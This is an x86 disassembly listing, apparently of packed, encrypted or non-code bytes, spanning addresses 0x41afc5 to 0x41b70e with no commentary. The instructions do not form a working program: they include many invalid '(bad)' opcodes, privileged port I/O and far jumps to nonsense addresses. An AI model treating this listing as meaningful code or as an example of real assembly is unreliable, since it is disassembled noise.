  41afc5:	jbe    0x41afc6
  41afc7:	aad    0xc6
  41afc9:	int    0xb8
  41afcb:	inc    ebp
  41afcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afcd:	dec    esp
  41afce:	or     al,0xd4
  41afd0:	repz push 0x35
  41afd3:	cmp    eax,0xea425379
  41afd8:	ror    DWORD PTR [esi+0x9],cl
  41afdb:	mov    al,ds:0x49d6c4b6
  41afe0:	(bad)  
  41afe1:	mov    dl,0xd7
  41afe3:	push   esi
  41afe4:	mov    edx,0x2cb2a77d
  41afe9:	les    esp,FWORD PTR [esi]
  41afeb:	hlt    
  41afec:	jmp    0xc500:0x216310a4
  41aff3:	adc    al,0xd8
  41aff5:	les    edi,FWORD PTR [ebx]
  41aff7:	aaa    
  41aff8:	(bad)  
  41aff9:	lods   al,BYTE PTR ds:[esi]
  41affa:	dec    esi
  41affb:	div    BYTE PTR es:[ebx]
  41affe:	mov    al,0x35
  41b000:	mov    al,0xb7
  41b002:	sub    ebx,ebx
  41b004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b005:	mov    cl,0x2d
  41b007:	ret    
  41b008:	or     edi,DWORD PTR [ecx-0x25]
  41b00b:	mov    ?,ebx
  41b00d:	dec    esp
  41b00e:	add    BYTE PTR [edi+edx*8],cl
  41b011:	mov    al,ds:0xddd35a21
  41b016:	inc    eax
  41b017:	jge    0x41b061
  41b019:	mov    eax,ebp
  41b01b:	xchg   esp,eax
  41b01c:	xchg   edi,eax
  41b01d:	add    BYTE PTR fs:[ebx+0x38],0x29
  41b022:	rsqrtps xmm4,XMMWORD PTR [edi-0x7b3df27f]
  41b029:	xor    dl,0x7
  41b02c:	pop    ebx
  41b02d:	jp     0x41afe1
  41b02f:	loope  0x41afee
  41b031:	retf   
  41b032:	xor    al,0x5b
  41b034:	cwde   
  41b035:	loope  0x41affc
  41b037:	mov    edx,0x6a292d38
  41b03c:	retf   0xc71f
  41b03f:	out    dx,al
  41b040:	stos   BYTE PTR es:[edi],al
  41b041:	mov    BYTE PTR [edi+0x2763ccb],dl
  41b047:	mov    ch,0xc5
  41b049:	test   eax,0x9b2eaed6
  41b04e:	push   0x82e03dca
  41b053:	vrsqrtss xmm3,xmm5,DWORD PTR [edi-0x2c]
  41b058:	cwde   
  41b059:	or     eax,0x5ff7b362
  41b05e:	mov    bl,0x4a
  41b060:	sub    ebx,DWORD PTR [edx]
  41b062:	in     al,0xa
  41b064:	loope  0x41b029
  41b066:	ds scas al,BYTE PTR es:[edi]
  41b068:	js     0x41b016
  41b06a:	push   esp
  41b06b:	sbb    DWORD PTR [ecx],esi
  41b06d:	out    dx,al
  41b06e:	sub    al,0x40
  41b070:	lods   al,BYTE PTR ds:[esi]
  41b071:	xchg   esi,eax
  41b072:	adc    bh,BYTE PTR [edi]
  41b074:	sbb    DWORD PTR [esi-0x2b2203f9],edx
  41b07a:	mov    ebp,0x48189d8d
  41b07f:	jno    0x41b027
  41b081:	inc    esp
  41b082:	ja     0x41b0b8
  41b084:	aad    0x4e
  41b086:	mov    ch,0x86
  41b088:	pop    ds
  41b089:	test   al,0xf6
  41b08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b08c:	fld    st(1)
  41b08e:	ror    ebx,cl
  41b090:	mov    eax,ds:0x3203d45f
  41b095:	xchg   ecx,eax
  41b096:	sti    
  41b097:	inc    ebp
  41b098:	(bad)  
  41b099:	and    al,0x9f
  41b09b:	xchg   ebp,eax
  41b09c:	fsubr  QWORD PTR [ebp-0xe1643f3]
  41b0a2:	aaa    
  41b0a3:	in     eax,dx
  41b0a4:	push   cs
  41b0a5:	test   al,0x52
  41b0a7:	in     al,dx
  41b0a8:	and    dh,cl
  41b0aa:	fdivrp st(3),st
  41b0ac:	push   0xffffffa4
  41b0ae:	into   
  41b0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0b0:	fs std 
  41b0b2:	cmp    BYTE PTR [ecx],ah
  41b0b4:	fwait
  41b0b5:	sub    DWORD PTR [esi],ebp
  41b0b7:	aad    0x53
  41b0b9:	push   ebx
  41b0ba:	das    
  41b0bb:	cmp    al,cl
  41b0bd:	or     edx,esi
  41b0bf:	dec    edx
  41b0c0:	jmp    0x6a0ed3ed
  41b0c5:	mov    cs,WORD PTR [ecx+0x2f79221f]
  41b0cb:	push   es
  41b0cc:	mov    al,ch
  41b0ce:	popa   
  41b0cf:	fmul   DWORD PTR [ebp+0x59]
  41b0d2:	mov    esp,0xec6ef995
  41b0d7:	and    DWORD PTR [ebx+0x31c14a9],ebx
  41b0dd:	arpl   WORD PTR [eax-0xed625f6],sp
  41b0e3:	or     BYTE PTR [ecx+0xa131160],0x2e
  41b0ea:	iret   
  41b0eb:	scas   al,BYTE PTR es:[edi]
  41b0ec:	gs repnz add eax,0x5b5ba4b1
  41b0f3:	ins    BYTE PTR es:[edi],dx
  41b0f4:	mov    ecx,0x4e87c60c
  41b0f9:	push   0x4cb76fc0
  41b0fe:	adc    al,0x1a
  41b100:	jge    0x41b142
  41b102:	in     al,dx
  41b103:	lock xchg esi,eax
  41b105:	clc    
  41b106:	arpl   WORD PTR [edi+0x1bd24ea5],cx
  41b10c:	iret   
  41b10d:	rsqrtps xmm2,xmm6
  41b110:	shl    BYTE PTR [esi],cl
  41b112:	sbb    DWORD PTR [edx],ecx
  41b114:	icebp  
  41b115:	jae    0x41b190
  41b117:	cmp    eax,0x6f578b99
  41b11c:	and    eax,0xb9a29c9
  41b121:	xor    al,0x6
  41b123:	sub    al,0x92
  41b125:	xor    dl,BYTE PTR [edi-0x18ebba70]
  41b12b:	jge    0x41b142
  41b12d:	jmp    0x7bc5e463
  41b132:	xchg   edx,eax
  41b133:	mov    bl,0x43
  41b135:	lock mov bl,0xb7
  41b138:	push   esp
  41b139:	lock add bl,BYTE PTR fs:[ebp-0x80]
  41b13e:	pop    ecx
  41b13f:	cdq    
  41b140:	and    bl,al
  41b142:	scas   al,BYTE PTR es:[edi]
  41b143:	mov    bl,0xe6
  41b145:	sbb    al,0x9a
  41b147:	dec    ebx
  41b148:	hlt    
  41b149:	mov    edx,0xc1bbe0ad
  41b14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b14f:	xchg   edx,eax
  41b150:	cmp    BYTE PTR [ebx],cl
  41b152:	push   edx
  41b153:	mov    ch,BYTE PTR [esp+ebp*8]
  41b156:	stos   BYTE PTR es:[edi],al
  41b157:	sub    al,0xd1
  41b159:	inc    ebp
  41b15a:	test   al,0xbb
  41b15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b15d:	sbb    eax,0x3b072952
  41b162:	dec    ebp
  41b163:	inc    ebx
  41b164:	push   0x59
  41b166:	push   esi
  41b167:	sub    al,BYTE PTR [ecx-0x7e7925e8]
  41b16d:	sub    cl,BYTE PTR [ecx]
  41b16f:	hlt    
  41b170:	xchg   ecx,eax
  41b171:	leave  
  41b172:	loope  0x41b150
  41b174:	dec    ecx
  41b175:	stos   BYTE PTR es:[edi],al
  41b176:	test   DWORD PTR [edx],ebx
  41b178:	pop    es
  41b179:	idiv   BYTE PTR [edx]
  41b17b:	imul   esp,ebx,0xffffffb6
  41b17e:	ret    
  41b17f:	sbb    DWORD PTR [eax+0x1f3714db],edi
  41b185:	test   al,0xc7
  41b187:	sbb    al,0x2e
  41b189:	add    eax,0x279ef64a
  41b18e:	xor    BYTE PTR [ecx+eax*1-0x4a750b88],cl
  41b195:	cmp    DWORD PTR [ebx-0x2],esi
  41b198:	jp     0x41b19b
  41b19a:	cmp    ah,BYTE PTR [ecx+ebx*1+0x5d]
  41b19e:	aaa    
  41b19f:	pop    eax
  41b1a0:	dec    esi
  41b1a1:	js     0x41b196
  41b1a3:	and    al,0x54
  41b1a5:	fmul   DWORD PTR [edi]
  41b1a7:	ins    BYTE PTR es:[edi],dx
  41b1a8:	ret    0x3b0a
  41b1ab:	cld    
  41b1ac:	aad    0xbd
  41b1ae:	or     dl,BYTE PTR [ebx]
  41b1b0:	out    0x6f,eax
  41b1b2:	sub    ebp,DWORD PTR [edx+0x9]
  41b1b5:	retf   0xc262
  41b1b8:	nop
  41b1b9:	inc    ebp
  41b1ba:	retf   
  41b1bb:	test   BYTE PTR [eax+0x52a284da],ah
  41b1c1:	cld    
  41b1c2:	(bad)  
  41b1c3:	pop    esp
  41b1c4:	inc    eax
  41b1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c6:	enter  0xd953,0xf8
  41b1ca:	aam    0xab
  41b1cc:	(bad)  
  41b1cd:	mov    BYTE PTR [eax+0x11fd0607],0xbc
  41b1d4:	cmp    DWORD PTR [edx+0x5f],esp
  41b1d7:	add    eax,0x9ee6fb30
  41b1dc:	or     DWORD PTR [ecx-0x48],0x9fea80cb
  41b1e3:	sub    eax,edx
  41b1e5:	rcl    DWORD PTR [edx+0x76],1
  41b1e8:	cdq    
  41b1e9:	push   cs
  41b1ea:	and    al,0x52
  41b1ec:	cmp    BYTE PTR [edi+0x21],bh
  41b1ef:	pop    ss
  41b1f0:	(bad)
  41b1f5:	imul   edi,DWORD PTR [edx],0xffffff98
  41b1f8:	ret    0xd497
  41b1fb:	les    eax,FWORD PTR [edx-0x17ddbfa3]
  41b201:	sbb    BYTE PTR [ecx],bl
  41b203:	stc    
  41b204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b205:	dec    ebp
  41b206:	loopne 0x41b280
  41b208:	jle    0x41b18e
  41b20a:	call   0xf5e2:0xe083334b
  41b211:	pop    ss
  41b212:	mov    esi,0x63268735
  41b217:	cmp    BYTE PTR [ecx],dl
  41b219:	lock ss aad 0x10
  41b21d:	mov    bl,0x2c
  41b21f:	push   edi
  41b220:	xlat   BYTE PTR ds:[ebx]
  41b221:	pushf  
  41b222:	push   esp
  41b223:	push   ecx
  41b224:	fwait
  41b225:	in     eax,0xba
  41b227:	xor    dh,BYTE PTR [edx]
  41b229:	cs aam 0x9
  41b22c:	xchg   ecx,eax
  41b22d:	dec    ebp
  41b22e:	repz jmp 0x952a:0x37936cba
  41b236:	aaa    
  41b237:	pusha  
  41b238:	xor    ebp,DWORD PTR [ebx]
  41b23a:	outs   dx,BYTE PTR ds:[esi]
  41b23b:	cdq    
  41b23c:	(bad)  
  41b23d:	call   0xf3892ba7
  41b242:	dec    edi
  41b243:	mov    bh,0x41
  41b245:	ret    
  41b246:	push   cs
  41b247:	mov    ecx,0x3e4888b5
  41b24c:	lock dec edx
  41b24e:	int    0x5d
  41b250:	sbb    eax,0x2ccd1322
  41b255:	xchg   BYTE PTR [ebp-0x76241b67],bl
  41b25b:	jne    0x41b260
  41b25d:	sub    BYTE PTR [esi+0x60],bl
  41b260:	or     bl,BYTE PTR [ecx-0x46]
  41b263:	push   0xadd2d190
  41b268:	ds pop cx
  41b26b:	addr16 sbb al,ch
  41b26e:	dec    ebx
  41b26f:	push   ss
  41b270:	xchg   ecx,eax
  41b271:	inc    esi
  41b272:	adc    cl,BYTE PTR [edi-0x28f9e218]
  41b278:	rcl    DWORD PTR [edx+0x2df24849],cl
  41b27e:	inc    edi
  41b27f:	les    ebx,FWORD PTR [ebp-0x15c40d9d]
  41b285:	fcomi  st,st(4)
  41b287:	into   
  41b288:	int3   
  41b289:	cs aad 0xcf
  41b28c:	adc    eax,0x903ec50f
  41b291:	dec    ebp
  41b292:	jne    0x41b253
  41b294:	repnz push es
  41b296:	imul   edi,eax,0x485c0221
  41b29c:	hlt    
  41b29d:	mov    BYTE PTR gs:[ecx-0x7ac05b29],ch
  41b2a4:	pop    esp
  41b2a5:	inc    ebp
  41b2a6:	leave  
  41b2a7:	dec    ebx
  41b2a8:	imul   ecx,eax,0xffffffa8
  41b2ab:	jmp    0x41b31d
  41b2ad:	sahf   
  41b2ae:	enter  0x9cc5,0x66
  41b2b2:	dec    esi
  41b2b3:	call   0x5778:0x379a4c6a
  41b2ba:	fcomi  st,st(3)
  41b2bc:	into   
  41b2bd:	mov    cl,0x8b
  41b2bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2c0:	rol    BYTE PTR [esi],0xa6
  41b2c3:	fst    DWORD PTR [ebx+ecx*4-0x7d]
  41b2c7:	(bad)  
  41b2c8:	dec    ebx
  41b2c9:	retf   
  41b2ca:	push   ecx
  41b2cb:	fwait
  41b2cc:	test   DWORD PTR [esi],ebx
  41b2ce:	sub    eax,0xb3167b77
  41b2d3:	outs   dx,DWORD PTR ds:[esi]
  41b2d4:	adc    al,0x6d
  41b2d6:	cmc    
  41b2d7:	pop    esp
  41b2d8:	(bad)  
  41b2d9:	mov    bl,0x10
  41b2db:	dec    ebx
  41b2dc:	sbb    al,0x72
  41b2de:	cli    
  41b2df:	pop    edi
  41b2e0:	daa    
  41b2e1:	adc    al,BYTE PTR [edi-0x54811bbf]
  41b2e7:	cmp    edi,DWORD PTR [ebx]
  41b2e9:	stos   BYTE PTR es:[edi],al
  41b2ea:	or     ecx,DWORD PTR [ebx+0x2a]
  41b2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2ee:	mov    ah,0xc7
  41b2f0:	xor    eax,0x2c53763c
  41b2f5:	sub    eax,0xad203fa
  41b2fa:	jo     0x41b33b
  41b2fc:	fneni(8087 only) 
  41b2fe:	fnsave [edx-0x64]
  41b301:	sbb    bl,ah
  41b303:	jo     0x41b33b
  41b305:	adc    al,0xb2
  41b307:	nop
  41b308:	or     ebp,DWORD PTR [ebp-0x54]
  41b30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b30c:	ss pop edx
  41b30e:	push   edx
  41b30f:	mov    bh,0x61
  41b311:	adc    dh,ch
  41b313:	ficom  DWORD PTR [ebx]
  41b315:	sahf   
  41b316:	sar    bl,1
  41b318:	(bad)  
  41b319:	call   0x94b2:0xceb10677
  41b320:	iret   
  41b321:	mov    dh,BYTE PTR [edi]
  41b323:	icebp  
  41b324:	push   esi
  41b325:	aad    0xdd
  41b327:	mov    ch,0x2
  41b329:	imul   esp,DWORD PTR [edx],0x40
  41b32c:	out    0x7a,al
  41b32e:	jecxz  0x41b34f
  41b330:	push   es
  41b331:	aad    0x72
  41b333:	jno    0x41b2be
  41b335:	(bad)  
  41b337:	popf   
  41b338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b339:	dec    eax
  41b33a:	mov    ecx,0x95678e0e
  41b33f:	adc    ah,bh
  41b341:	ins    BYTE PTR es:[edi],dx
  41b342:	not    edx
  41b344:	or     eax,0x77318133
  41b349:	adc    edi,esp
  41b34b:	icebp  
  41b34c:	inc    edi
  41b34d:	xor    BYTE PTR [edx+0x32f0260c],0x7d
  41b354:	mov    esi,0xdd4fe35
  41b359:	inc    esp
  41b35a:	bound  ebp,QWORD PTR ds:0x52526ed9
  41b360:	or     al,0x10
  41b362:	in     eax,dx
  41b363:	rcl    eax,0xd0
  41b366:	std    
  41b367:	or     eax,0x389346d4
  41b36c:	arpl   bp,dx
  41b36e:	hlt    
  41b36f:	repz (bad) 
  41b371:	aam    0xe
  41b373:	mov    al,0x1f
  41b375:	inc    edx
  41b376:	mov    eax,ds:0x292d1bc7
  41b37b:	ins    BYTE PTR es:[edi],dx
  41b37c:	and    DWORD PTR ds:0x9e6dc25c,edx
  41b382:	ror    BYTE PTR [ebp+0x77],cl
  41b385:	fs jge 0x41b3cf
  41b388:	int    0x52
  41b38a:	mov    edi,0xd1aa70ad
  41b38f:	or     ecx,DWORD PTR [ebx]
  41b391:	test   DWORD PTR [ebx],0xba47a906
  41b397:	jecxz  0x41b3f6
  41b399:	test   BYTE PTR [eax+edi*2-0x3ec7d6a9],0x49
  41b3a1:	rol    BYTE PTR [ebx+0x4b04da7d],0x2b
  41b3a8:	aas    
  41b3a9:	jb     0x41b390
  41b3ab:	mov    cl,0x46
  41b3ad:	adc    DWORD PTR [edx],esp
  41b3af:	ficomp DWORD PTR [eax+0x541f725b]
  41b3b5:	mov    ds:0x3937f367,eax
  41b3ba:	push   ebx
  41b3bb:	jg     0x41b3d5
  41b3bd:	xchg   esp,eax
  41b3be:	fsubr  QWORD PTR [esi]
  41b3c0:	jle    0x41b3b8
  41b3c2:	jmp    0x41b3ed
  41b3c4:	inc    ebp
  41b3c5:	inc    eax
  41b3c6:	cmp    eax,0x28fb576f
  41b3cb:	sahf   
  41b3cc:	scas   al,BYTE PTR es:[edi]
  41b3cd:	pop    esp
  41b3ce:	cmp    DWORD PTR [ecx],ebx
  41b3d0:	xor    eax,0x84bd2a2b
  41b3d5:	jo     0xc7fb8d71
  41b3db:	shr    BYTE PTR [edx-0x75330900],1
  41b3e1:	jge    0x41b3a7
  41b3e3:	cmp    al,0x7e
  41b3e5:	mov    esp,0xc2bf59b3
  41b3ea:	jg     0x41b458
  41b3ec:	sub    eax,0xbc5e56e4
  41b3f1:	fisttp QWORD PTR [ebx+0x53]
  41b3f4:	xchg   DWORD PTR [ebx-0x53],eax
  41b3f7:	jne    0x41b3d3
  41b3f9:	in     eax,dx
  41b3fa:	mov    DWORD PTR [eax+esi*8+0x7d1b452],ebp
  41b401:	rol    BYTE PTR [eax+esi*1],0xd2
  41b405:	mov    es,WORD PTR [edx]
  41b407:	mov    ah,BYTE PTR [ebx]
  41b409:	and    DWORD PTR [eax],edi
  41b40b:	push   cs
  41b40c:	xchg   ebx,eax
  41b40d:	cs stc 
  41b40f:	jge    0x41b443
  41b411:	ret    0xeac7
  41b414:	and    eax,0x150eeab2
  41b419:	sbb    DWORD PTR ds:0x5580e258,ecx
  41b41f:	repnz test DWORD PTR [ebx-0x80],ecx
  41b423:	push   0x6f282d67
  41b428:	imul   eax,DWORD PTR [edi],0xffffffd3
  41b42b:	hlt    
  41b42c:	mov    al,ds:0xb74e378e
  41b431:	sbb    al,0xbb
  41b433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b434:	xor    DWORD PTR [esi-0x232f58b2],0x38aa2ce5
  41b43e:	sbb    cl,BYTE PTR [ecx-0x22]
  41b441:	lahf   
  41b442:	int3   
  41b443:	lods   eax,DWORD PTR cs:[esi]
  41b445:	(bad)  ds:0x465d877d
  41b44b:	and    al,0xe6
  41b44d:	xchg   ecx,eax
  41b44e:	icebp  
  41b44f:	mul    DWORD PTR [ebx+0x3f45a0c]
  41b455:	dec    edi
  41b456:	xlat   BYTE PTR fs:[ebx]
  41b458:	or     BYTE PTR [ebx+0x2e6df7bc],0x2c
  41b45f:	sub    al,0xd0
  41b461:	mov    eax,ds:0x4a36fb9b
  41b466:	popf   
  41b467:	push   edi
  41b468:	lahf   
  41b469:	inc    ebx
  41b46a:	cmp    bl,BYTE PTR [ecx+eax*4]
  41b46d:	stc    
  41b46e:	addr16 in eax,dx
  41b470:	push   0x12
  41b472:	pop    DWORD PTR [edx+0x21]
  41b475:	inc    edx
  41b476:	ror    ebp,0x55
  41b479:	lock data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b47c:	adc    ah,BYTE PTR [edx+ecx*4-0xd]
  41b480:	sbb    ecx,DWORD PTR [ebx+0x47ba4b80]
  41b486:	fs dec eax
  41b488:	sub    al,0x7f
  41b48a:	in     eax,dx
  41b48b:	les    esi,FWORD PTR [esi-0x407216d0]
  41b491:	mov    al,0x53
  41b493:	lds    ebx,FWORD PTR [ecx]
  41b495:	ss push esp
  41b497:	dec    edi
  41b498:	xchg   DWORD PTR [ecx-0x4abeb0af],ebp
  41b49e:	cmp    eax,0xfead2988
  41b4a3:	xchg   DWORD PTR [edx],ebx
  41b4a5:	jo     0x41b438
  41b4a7:	(bad)  
  41b4a9:	aas    
  41b4aa:	xchg   esi,eax
  41b4ab:	pushf  
  41b4ac:	jge    0x41b506
  41b4ae:	in     al,dx
  41b4af:	je     0x41b432
  41b4b1:	leave  
  41b4b2:	shl    BYTE PTR [edx-0x3a],1
  41b4b5:	(bad)  
  41b4b6:	jmp    0x9edd5eee
  41b4bb:	daa    
  41b4bc:	sahf   
  41b4bd:	xor    esi,DWORD PTR [ecx]
  41b4bf:	or     eax,0xa596df3c
  41b4c4:	not    BYTE PTR ss:[eax-0x16b1e81b]
  41b4cb:	sub    bh,BYTE PTR [edi]
  41b4cd:	xor    ch,BYTE PTR [ebx-0x77]
  41b4d0:	sub    eax,0xf5693c4e
  41b4d5:	lahf   
  41b4d6:	cwde   
  41b4d7:	inc    edx
  41b4d8:	scas   al,BYTE PTR es:[edi]
  41b4d9:	xchg   ebp,eax
  41b4da:	mov    ebx,0xcce76444
  41b4df:	mov    bl,0x3b
  41b4e1:	add    esi,DWORD PTR [esi]
  41b4e3:	jle    0x41b508
  41b4e5:	rol    DWORD PTR [ecx],0xbd
  41b4e8:	mov    edi,0xbca6e9ca
  41b4ed:	pop    esi
  41b4ee:	in     al,dx
  41b4ef:	repnz mov ds:0xd4223a05,al
  41b4f5:	lds    esi,FWORD PTR ds:0xad8ce781
  41b4fb:	shl    DWORD PTR [edi+0x4a],1
  41b4fe:	mov    ds:0x2fc02a62,eax
  41b503:	(bad)  
  41b504:	and    al,0xd3
  41b506:	fcom   DWORD PTR [esi+0x17]
  41b509:	ret    
  41b50a:	xor    eax,0xf183251e
  41b50f:	push   ebp
  41b510:	push   esp
  41b511:	aad    0x44
  41b513:	jge    0x41b51e
  41b515:	icebp  
  41b516:	idiv   DWORD PTR [edx]
  41b518:	xchg   esi,eax
  41b519:	test   DWORD PTR [esi+0x1119d14f],ebp
  41b51f:	lea    edx,[ebx-0x4d]
  41b522:	pop    edx
  41b523:	ins    BYTE PTR es:[edi],dx
  41b524:	hlt    
  41b525:	push   ebx
  41b526:	dec    edx
  41b527:	cld    
  41b528:	test   DWORD PTR [ecx],ecx
  41b52a:	das    
  41b52b:	popf   
  41b52c:	or     ch,ah
  41b52e:	loopne 0x41b4f9
  41b530:	mov    BYTE PTR [esi+esi*8+0x3d],dl
  41b534:	jg     0x41b4bd
  41b536:	pop    edi
  41b537:	xchg   esp,eax
  41b538:	jmp    0x8f9b:0x1aa935c0
  41b53f:	cmp    cl,BYTE PTR [esi]
  41b541:	call   0xf10590a1
  41b546:	in     eax,dx
  41b547:	push   es
  41b548:	dec    esi
  41b549:	rcr    BYTE PTR [eax-0x73],1
  41b54c:	adc    DWORD PTR [esi],edx
  41b54e:	arpl   bx,bp
  41b550:	mov    esp,0xce0419fe
  41b555:	mov    eax,DWORD PTR [ebp+ebx*4+0x1306f5de]
  41b55c:	dec    ecx
  41b55d:	lods   al,BYTE PTR ds:[esi]
  41b55e:	adc    edx,DWORD PTR [esi]
  41b560:	(bad)  
  41b561:	cmp    BYTE PTR [esi],dh
  41b563:	loop   0x41b583
  41b565:	retf   0xfca1
  41b568:	dec    esi
  41b569:	int    0x56
  41b56b:	xlat   BYTE PTR ds:[ebx]
  41b56c:	dec    ecx
  41b56d:	paddw  mm5,QWORD PTR [ecx]
  41b570:	imul   esi,DWORD PTR [esi+0x63db077e],0x92b9e205
  41b57a:	push   ebp
  41b57b:	icebp  
  41b57c:	push   esi
  41b57d:	inc    edi
  41b57e:	and    BYTE PTR [ebp-0x76],dh
  41b581:	xchg   ebx,eax
  41b582:	cmp    bh,BYTE PTR [ecx]
  41b584:	in     al,0xc1
  41b586:	inc    edi
  41b587:	jns    0x41b5b9
  41b589:	xor    eax,ebp
  41b58b:	imul   edx,DWORD PTR [eax+0x49],0x10
  41b58f:	js     0x41b5bc
  41b591:	scas   eax,DWORD PTR es:[edi]
  41b592:	mov    ebx,0x754aedc0
  41b597:	or     DWORD PTR [ebp-0x6c],edx
  41b59a:	(bad)  
  41b59b:	gs and bl,ch
  41b59e:	stos   DWORD PTR es:[edi],eax
  41b59f:	enter  0x503c,0xa
  41b5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a4:	xchg   esp,eax
  41b5a5:	add    bh,cl
  41b5a7:	dec    ebp
  41b5a8:	rcr    DWORD PTR [ebx+0x11],0x70
  41b5ac:	pushf  
  41b5ad:	inc    ebx
  41b5ae:	or     edx,DWORD PTR [edi-0x36]
  41b5b1:	or     eax,0xa9a6c7ac
  41b5b6:	stos   BYTE PTR es:[edi],al
  41b5b7:	pushf  
  41b5b8:	xchg   ecx,eax
  41b5b9:	fldcw  WORD PTR [ebx-0x61dd12cb]
  41b5bf:	or     ch,0x68
  41b5c2:	mov    esp,0xab2c9181
  41b5c7:	inc    ecx
  41b5c8:	lock das 
  41b5ca:	cmc    
  41b5cb:	xchg   DWORD PTR [ebx+0xf],esp
  41b5ce:	ins    DWORD PTR es:[edi],dx
  41b5cf:	jle    0x41b607
  41b5d1:	pop    ebx
  41b5d2:	pop    esi
  41b5d3:	mov    BYTE PTR [esi],bl
  41b5d5:	push   esi
  41b5d6:	addr16 add ecx,esp
  41b5d9:	sbb    al,0x2f
  41b5db:	and    eax,0xebd2a530
  41b5e0:	pop    ss
  41b5e1:	sub    eax,0x57f3e3c2
  41b5e6:	jb     0x41b5da
  41b5e8:	(bad)  
  41b5e9:	mul    DWORD PTR [ebp*4+0x733f82f2]
  41b5f0:	adc    al,0x4
  41b5f2:	cmp    cl,ch
  41b5f4:	ins    DWORD PTR es:[edi],dx
  41b5f5:	mov    cs,ecx
  41b5f7:	xchg   esi,eax
  41b5f8:	popf   
  41b5f9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41b5fb:	pop    ecx
  41b5fc:	sbb    bl,cl
  41b5fe:	add    al,0xa3
  41b600:	push   ss
  41b601:	mov    BYTE PTR [edi+0x53],0x97
  41b605:	xchg   ecx,edx
  41b607:	sbb    eax,0xea3b3e89
  41b60c:	push   edi
  41b60d:	mov    dl,0xf8
  41b60f:	arpl   WORD PTR [edi+0x56c90a30],dx
  41b615:	or     eax,0xfd16bc19
  41b61a:	jmp    0xc9fd:0x66a206d2
  41b621:	xor    DWORD PTR [ebx+eiz*2],0x4a
  41b625:	mov    DWORD PTR [esi+0x14],ecx
  41b628:	test   BYTE PTR [edi],ch
  41b62a:	cmp    bh,BYTE PTR [ecx+0x236259f2]
  41b630:	out    0x39,eax
  41b632:	mov    bl,0x51
  41b634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b635:	or     edi,DWORD PTR [edi-0x15c2b53b]
  41b63b:	les    esi,FWORD PTR [eax-0x2c11a9e7]
  41b641:	lods   al,BYTE PTR ds:[esi]
  41b642:	push   ds
  41b643:	mov    cl,0x50
  41b645:	push   esp
  41b646:	sahf   
  41b647:	jnp    0x41b692
  41b649:	out    0x61,eax
  41b64b:	jg     0x41b6cc
  41b64d:	test   DWORD PTR [eax-0x1fb30284],edx
  41b653:	lea    esp,[esi-0x2f9ee73d]
  41b659:	fisubr DWORD PTR es:[esi-0x3f]
  41b65d:	mov    BYTE PTR [edx-0x69f64108],ch
  41b663:	arpl   bp,bp
  41b665:	out    0xae,eax
  41b667:	mov    dh,0x0
  41b669:	mov    edi,DWORD PTR [edi-0x197b0d69]
  41b66f:	dec    ebx
  41b670:	jae    0x41b658
  41b672:	or     al,al
  41b674:	cmp    al,0x3a
  41b676:	out    0xa3,al
  41b678:	in     al,dx
  41b679:	arpl   di,cx
  41b67b:	imul   esp
  41b67d:	popf   
  41b67e:	inc    edx
  41b67f:	mov    ah,0xb5
  41b681:	dec    eax
  41b682:	mov    edx,0x4be052cf
  41b687:	iret   
  41b688:	out    0xa5,al
  41b68a:	retf   0xde76
  41b68d:	xlat   BYTE PTR ds:[ebx]
  41b68e:	call   0x23b:0x48798078
  41b695:	or     ah,dh
  41b697:	mov    dh,0x7f
  41b699:	push   ss
  41b69a:	cmp    BYTE PTR [esi],0xfe
  41b69d:	shl    DWORD PTR [ebx+0x4f],0xa7
  41b6a1:	outs   dx,BYTE PTR ds:[esi]
  41b6a2:	xor    edi,DWORD PTR [ebx]
  41b6a4:	dec    ecx
  41b6a5:	adc    DWORD PTR [esi+edx*2],esi
  41b6a8:	outs   dx,BYTE PTR ds:[esi]
  41b6a9:	mov    esp,0x8a6e704f
  41b6ae:	jl     0x41b633
  41b6b0:	jbe    0x41b704
  41b6b2:	dec    ebx
  41b6b3:	inc    ebx
  41b6b4:	ret    
  41b6b5:	pop    ss
  41b6b6:	pushf  
  41b6b7:	stc    
  41b6b8:	enter  0x65f4,0xc9
  41b6bc:	daa    
  41b6bd:	jmp    0x41b6ad
  41b6bf:	mov    dl,0x6
  41b6c1:	dec    esp
  41b6c2:	mov    eax,ds:0x73e741a4
  41b6c7:	sub    dh,BYTE PTR [edi]
  41b6c9:	push   esi
  41b6ca:	rcr    DWORD PTR [eax+ecx*1+0x1b],cl
  41b6ce:	pop    ebp
  41b6cf:	dec    edx
  41b6d0:	outs   dx,BYTE PTR ds:[esi]
  41b6d1:	sbb    BYTE PTR [ecx+0x19],cl
  41b6d4:	and    dh,BYTE PTR [ebp-0x4ecb91ff]
  41b6da:	daa    
  41b6db:	rol    ebp,0xbe
  41b6de:	pop    ebx
  41b6df:	test   eax,0xd05b557b
  41b6e4:	jae    0x41b717
  41b6e6:	mov    ebx,ebx
  41b6e8:	jmp    0x41b72d
  41b6ea:	ret    0xe0ce
  41b6ed:	mov    ebp,0x535e4d36
  41b6f2:	clc    
  41b6f3:	pop    ss
  41b6f4:	cmp    ecx,ebp
  41b6f6:	mov    ecx,DWORD PTR [eax+0x3b]
  41b6f9:	sub    dl,BYTE PTR [ecx]
  41b6fb:	fst    QWORD PTR [ecx+0x3b]
  41b6fe:	rcl    al,cl
  41b700:	cmc    
  41b701:	out    0xcc,eax
  41b703:	mov    dl,BYTE PTR [ecx-0x5edc4140]
  41b709:	pop    es
  41b70a:	repz xchg ebp,edi
  41b70d:	pop    esi
  41b70e:	dec    ecx
